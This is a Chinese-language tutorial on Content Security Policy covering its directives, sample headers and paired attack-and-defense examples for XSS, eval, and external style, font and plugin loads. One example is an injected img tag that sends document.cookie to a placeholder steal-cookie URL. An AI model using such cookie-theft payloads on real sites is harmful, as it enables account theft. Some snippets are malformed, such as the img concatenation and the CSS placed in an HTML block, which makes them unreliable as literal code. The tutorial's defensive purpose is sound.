# 内容安全策略（CSP）

## 1. CSP 概述
### 1.1 定义
内容安全策略（Content Security Policy，简称 CSP）是一种浏览器安全特性，它允许网站管理员控制网页上可以加载和执行的资源。CSP 的主要目的是有效防御跨站脚本攻击（XSS）及其他网络安全威胁。

### 1.2 目标
- **防御 XSS 攻击：** 通过阻止恶意脚本注入来保护用户。
- **降低数据泄漏风险：** 限制与外部站点的交互，从而减少数据被非授权方访问的可能性。
- **控制外部资源加载：** 明确指定安全的资源，阻止不安全或未授权的资源加载。

## 2. 实施 CSP
### 2.1 设置 CSP 头部
CSP 通过在 HTTP 头部中添加规则来实现，格式通常如下：
```http
Content-Security-Policy: directive1 value1; directive2 value2; ...
```

### 2.2 主要

指令
- **default-src：** 定义默认资源加载策略，适用于所有资源类型。
- **script-src：** 限制 JavaScript 脚本的来源，控制执行脚本的域。
- **style-src：** 设置允许加载的样式表来源。
- **img-src：** 指定允许加载的图片资源。
- **connect-src：** 限制通过 XHR、WebSocket 等技术进行的数据传输。
- **font-src：** 规定可加载的 Web 字体资源。
- **frame-src：** 指定哪些源可以作为框架或 iframe 嵌入。
- **media-src：** 定义允许加载的音频和视频资源。
- **object-src：** 控制插件类型资源的加载。
- **form-action：** 规定表单提交的目标 URL，有助于防御 CSRF 攻击。
- **frame-ancestors：** 控制页面是否可以被嵌入到其他框架或 iframe 中。
- **plugin-types：** 限制通过插件加载的内容类型。
- **base-uri：** 限制 `<base>` 元素的 URL。
- **manifest-src：** 控制 Web 应用程序清单文件的加载。
- **require-sri-for：** 要求通过 Subresource Integrity (SRI) 验证的资源类型。
- **report-uri/report-to：** 指定接收 CSP 违规报告的端点。

## 3. CSP 的优势
### 3.1 提高安全性
CSP 显著减少潜在的安全威胁，尤其在防御 XSS 攻击方面表现卓越。

### 3.2 降低数据泄漏风险
通过限制跨域交互，CSP 有效减少敏感数据被非授权方访问的风险。

### 3.3 减轻安全漏洞影响
即使存在安全漏洞，CSP 通过限制可执行脚本和其他资源的加载，降低潜在危害。

## 4. 实际案例与攻击示例
### 4.1 基本 CSP 头部实现
只允许同源资源加载：
```http
Content-Security-Policy: default-src 'self';
```

### 4.2 特定来源脚本
允许从本站点和指定可信站点加载脚本：
```http
Content-Security-Policy: script-src 'self' coinex.com;
```

### 4.3 攻击示例
#### 4.3.1 防御 XSS 攻击
- **尝试：**
  ```html
  <!-- 用户评论中的脚本 -->
  <script>alert('这是一个示例!');</script>
  ```
- **CSP 设置：** `Content-Security-Policy: script-src 'self';`
- **效果：** 只执行来自同一源的脚本，阻止外部脚本执行。

#### 4.3.2 防止内联脚本攻击
- **尝试：**
  ```html
  <!-- 内联脚本注入 -->
  <script>console.log('内联脚本执行');</script>
  ```
- **CSP 设置：** `Content-Security-Policy: script-src 'self' 'nonce-随机值';`
- **效果：** 只执行带有正确 nonce 的脚本，防止未授权内联脚本执行。

#### 4.3.3 防止 `unsafe-eval` 攻击
- **尝试：**
  ```javascript
  // 假设的攻击代码 恶意代码作为字符串，通过 eval() 执行
  var maliciousCode = "alert('恶意代码执行')";
  eval(maliciousCode);
  ```
- **CSP 设置：** `Content-Security-Policy: script-src 'self' 'nonce-随机值';`
- **效果：** 阻止使用 `eval()` 执行恶意代码字符串。

#### 4.3.4 防止外部样式注入
- **尝试：**
  ```html
  <!-- 外部样式注入 -->
  <link rel="stylesheet" href="https://example.com/malicious-style.css">
  ```
- **CSP 设置：** `Content-Security-Policy: style-src 'self';`
- **效果：** 仅允许加载来自同一源（网站本身）的样式表。任何来自外部域的样式表都将被阻止。

#### 4.3.5 阻止数据盗取
- **尝试：**
  ```html
  <!-- 图像标签注入 -->
  <img src="https://example.com/steal-cookie?cookie=" + document.cookie />
  ```
- **CSP 设置：** `Content-Security-Policy: img-src 'self';`
- **效果：** 只加载来自同一源的图片，阻止数据通过图像请求发送到外部服务器。

#### 4.3.6 控制字体加载
- **尝试：**
  攻击者尝试通过从外部源加载恶意字体文件来执行攻击。
  ```html
  <!-- 外部字体文件 -->
  @font-face {
    font-family: 'MyWebFont';
    src: url('https://example.com/malicious-font.woff2') format('woff2');
  }
  ```
- **CSP 设置：** `Content-Security-Policy: font-src 'self';`
- **效果：** 这个策略限制字体文件只能从当前网站源加载，从而防止了外部恶意字体文件的加载。

#### 4.3.7 阻止任何类型的插件
- **尝试：**
  攻击者尝试通过嵌入 `<object>` 或 `<embed>` 标签来加载恶意插件。
  ```html
  <!-- 插件嵌入 -->
  <object data="malicious-plugin.swf" type="application/x-shockwave-flash"></object>
  ```
- **CSP 设置：** `Content-Security-Policy: object-src 'none';`
- **效果：** 这个策略将阻止网页加载任何类型的插件，从而增加了安全性。

## 5. 注意事项与最佳实践
- **调试与测试：** 确保 CSP 规则不误阻合法资源。
- **浏览器兼容性：** 考虑不同浏览器对 CSP 的支持差异。
- **持续更新：** 根据应用和外部资源的变化适时调整 CSP 规则。
- **多层防御：** 将 CSP 作为全面安全策略的一部分，与数据验证等措施结合使用。

## 6. 结论
CSP 是现代 Web 应用安全的关键组成部分，通过规范化资源加载方式，有效防御多种网络威胁。合理配置和维护 CSP 规则是提高应用程序安全性的重要步骤，可以显著降低遭受攻击的风险。
